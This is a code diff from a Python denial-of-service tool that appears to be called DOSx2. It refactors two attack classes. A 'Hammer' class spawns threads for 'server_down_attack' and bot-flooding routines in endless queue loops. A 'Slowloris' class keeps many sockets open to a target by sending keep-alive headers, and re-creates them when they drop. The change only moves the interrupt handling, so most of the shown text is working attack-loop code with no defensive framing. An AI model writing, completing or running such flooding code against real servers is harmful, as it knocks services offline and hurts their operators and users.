@@ -226,25 +226,20 @@ class Hammer:
         time.sleep(5)
 
         while True:
-            try:
-                for _ in range(self.turbo):
-                    threading.Thread(target=self.server_down_attack, daemon=True).start()
-                    threading.Thread(target=self.server_bot_harrming_attack, daemon=True).start()
-                
-                task_count = 0
-                while True:
-                    if (task_count > 1800):
-                        task_count = 0
-                        time.sleep(.1)
-                    task_count += 1
-                    self.queue_one.put(task_count)
-                    self.queue_two.put(task_count)
-                self.queue_one.join()
-                self.queue_two.join()
-
-            except (KeyboardInterrupt, SystemExit):
-                print(FontColors.blue(time.ctime())+FontColors.yellow(" << Attack Stopping << endl"))
-                sys.exit(0)
+            for _ in range(self.turbo):
+                threading.Thread(target=self.server_down_attack, daemon=True).start()
+                threading.Thread(target=self.server_bot_harrming_attack, daemon=True).start()
+            
+            task_count = 0
+            while True:
+                if (task_count > 1800):
+                    task_count = 0
+                    time.sleep(.1)
+                task_count += 1
+                self.queue_one.put(task_count)
+                self.queue_two.put(task_count)
+            self.queue_one.join()
+            self.queue_two.join()
 
 
 class Slowloris:
@@ -309,32 +304,27 @@ class Slowloris:
                 break
             list_of_sockets.append(a_socket)
         
-        while True:
-            try:
-                
-                print(FontColors.blue(time.ctime()), \
-                FontColors.green(f"Sending keep-alive headers... Socket count: {len(list_of_sockets)}"))
-                
-                for s in list(list_of_sockets):
-                    try:
-                        s.send(self.create_xa_header())
-                    except socket.error:
-                        list_of_sockets.remove(s)
-                
-                for _ in range(self.socket_count - len(list_of_sockets)):
-                    print(FontColors.yellow("Recreating sockets..."))
-                    try:
-                        a_socket = self.create_socket()
-                        if a_socket:
-                            list_of_sockets.append(a_socket)
-                    except socket.error:
-                        break
+        while True:                
+            print(FontColors.blue(time.ctime()), \
+            FontColors.green(f"Sending keep-alive headers... Socket count: {len(list_of_sockets)}"))
+            
+            for s in list(list_of_sockets):
+                try:
+                    s.send(self.create_xa_header())
+                except socket.error:
+                    list_of_sockets.remove(s)
+            
+            for _ in range(self.socket_count - len(list_of_sockets)):
+                print(FontColors.yellow("Recreating sockets..."))
+                try:
+                    a_socket = self.create_socket()
+                    if a_socket:
+                        list_of_sockets.append(a_socket)
+                except socket.error:
+                    break
 
-                time.sleep(10)
-                    
-            except (KeyboardInterrupt, SystemExit):
-                print(FontColors.blue(time.ctime()), FontColors.yellow("Stopping Slowloris!"))
-                sys.exit(0)
+            time.sleep(10)
+
 
     def create_xa_header(self) -> bytes:
         """return the header for X-a"""
@@ -366,7 +356,11 @@ def main():
 
 if __name__ == "__main__":
     
-    main()
+    try:
+        main()
+    except (KeyboardInterrupt, SystemExit):
+        print(FontColors.blue(time.ctime()), FontColors.yellow("Stopping DOSx2"))
+        sys.exit(0)
     
 
     
